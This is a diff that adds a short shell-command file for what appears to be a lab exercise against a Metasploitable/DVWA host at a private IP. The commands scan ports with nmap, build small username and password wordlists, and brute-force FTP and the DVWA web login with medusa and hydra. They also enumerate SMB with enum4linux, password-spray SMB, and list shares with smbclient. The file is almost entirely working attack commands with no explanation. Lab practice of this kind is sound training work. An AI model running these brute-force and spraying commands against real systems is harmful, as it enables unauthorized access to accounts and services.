@@ -1,0 +1,29 @@
+nmap 192.168.100.1
+
+nmap -sV -p 211,22,80,443,139 192.168.100.1
+
+ftp 192.168.100.1
+
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
+echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt
+
+medusa -h 192.168.100.1 -U users.txt -P pass.txt -M ftp -t 6
+
+medusa -h 192.168.100.1 -U users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php'\
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=login failed' -t 6
+
+hydra -L users.txt -P pass.txt 192.168.100.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+
+enum4linux -a 192.168.100.1 | tee enum4_output.txt´
+
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+medusa -h 192.168.100.1 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T50
+
+smbclient -L //192.168.100.1 -U msfadmin
+
